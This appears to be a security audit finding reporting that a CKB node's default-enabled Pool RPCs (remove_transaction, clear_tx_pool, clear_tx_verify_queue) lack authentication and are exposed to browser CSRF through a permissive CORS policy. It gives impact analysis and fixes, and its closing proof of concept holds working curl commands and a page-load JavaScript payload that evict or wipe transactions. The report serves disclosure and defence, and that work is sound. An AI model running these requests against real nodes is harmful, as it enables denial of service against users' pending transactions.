### Title
Unauthenticated `remove_transaction` and `clear_tx_pool` RPCs Allow Any Caller to Evict Arbitrary Transactions from the Pool — (File: rpc/src/module/pool.rs)

---

### Summary

The `remove_transaction`, `clear_tx_pool`, and `clear_tx_verify_queue` RPC methods in the Pool module carry no authentication or authorization check. The Pool module is enabled by default. Any process with access to the RPC endpoint — including a browser tab via CSRF, because the server applies `CorsLayer::permissive()` — can remove any transaction and its entire dependent chain from the mempool. This is a direct analog to the reported pattern: a function that should be restricted to a privileged caller is reachable by any unprivileged caller, enabling targeted denial-of-service against pending transactions.

---

### Finding Description

**Root cause — no caller check on state-mutating Pool RPCs**

`remove_transaction` in `rpc/src/module/pool.rs` (lines 662–669) calls `tx_pool.remove_local_tx(tx_hash.into())` with zero authentication:

```rust
fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
        error!("Send remove_tx request error {}", e);
        RPCError::ckb_internal_error(e)
    })
}
``` [1](#0-0) 

`clear_tx_pool` (lines 684–692) and `clear_tx_verify_queue` (lines 694–701) are identical in structure — no guard, no token, no IP check: [2](#0-1) 

**Pool module is enabled by default**

`resource/ckb.toml` line 190 lists `"Pool"` in the default modules array, so these methods are live on every standard node: [3](#0-2) 

**RPC server uses `CorsLayer::permissive()`**

`rpc/src/server.rs` line 124 applies a fully permissive CORS policy to the HTTP server:

```rust
.layer(CorsLayer::permissive())
``` [4](#0-3) 

This means any browser origin can issue a preflight-approved POST to `http://127.0.0.1:8114`. The RPC is bound to localhost by default, but `CorsLayer::permissive()` removes the browser's cross-origin barrier, enabling CSRF from any website the node operator visits.

**Attack flow**

1. Attacker (local process or browser CSRF) calls `get_raw_tx_pool` — also unauthenticated — to enumerate pending tx hashes.
2. Attacker calls `remove_transaction` with a target hash.
3. The target transaction **and all dependent transactions** are evicted from the pool (cascade removal via `remove_local_tx`).
4. Attacker repeats as the victim resubmits, achieving sustained exclusion of specific transactions.
5. Alternatively, a single call to `clear_tx_pool` wipes the entire mempool. [5](#0-4) 

---

### Impact Explanation

- **Targeted transaction DOS**: An attacker can prevent any specific transaction from ever being confirmed by evicting it on every resubmission. Entire dependent chains are removed in one call.
- **Time-sensitive transaction failure**: Transactions with `since` time-lock constraints or DeFi operations that must land within a specific epoch window can be permanently excluded.
- **Full mempool wipe**: `clear_tx_pool` removes every pending and proposed transaction in a single unauthenticated call, resetting the node's mempool to empty.
- **Verification queue disruption**: `clear_tx_verify_queue` drops all transactions awaiting script verification, stalling the node's admission pipeline.

---

### Likelihood Explanation

- The Pool module is enabled by default; no operator action is needed to expose these methods.
- The RPC binds to `127.0.0.1:8114` by default, but `CorsLayer::permissive()` makes it reachable from any browser tab on the same machine — no local shell access required.
- The attack requires a single HTTP POST with a known tx hash (obtainable from `get_raw_tx_pool`, also unauthenticated).
- No cryptographic material, privileged key, or network position is needed.

---

### Recommendation

1. **Add authentication to state-mutating Pool RPCs.** Introduce an API token or shared secret checked at the handler level for `remove_transaction`, `clear_tx_pool`, and `clear_tx_verify_queue`.
2. **Replace `CorsLayer::permissive()` with a restrictive policy.** Allow only `http://127.0.0.1` or no cross-origin access at all, eliminating the browser CSRF vector.
3. **Separate destructive operations into a restricted module.** Move `remove_transaction`, `clear_tx_pool`, and `clear_tx_verify_queue` out of the default-enabled `Pool` module into an opt-in admin module, analogous to how `IntegrationTest` is opt-in.

---

### Proof of Concept

**Local process (no privileges required):**
```bash
# Enumerate the pool
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"get_raw_tx_pool","params":[false],"id":1}'

# Evict a specific transaction and all its dependents
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"remove_transaction","params":["0x<tx_hash>"],"id":2}'

# Or wipe the entire mempool
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":3}'
```

**Browser CSRF (malicious webpage visited by node operator):**
```javascript
// No user interaction beyond page load required
fetch('http://127.0.0.1:8114', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    jsonrpc: '2.0', method: 'clear_tx_pool', params: [], id: 1
  })
});
```

`CorsLayer::permissive()` responds to the browser's OPTIONS preflight with `Access-Control-Allow-Origin: *`, so the browser proceeds with the POST. The mempool is cleared with no authentication challenge.
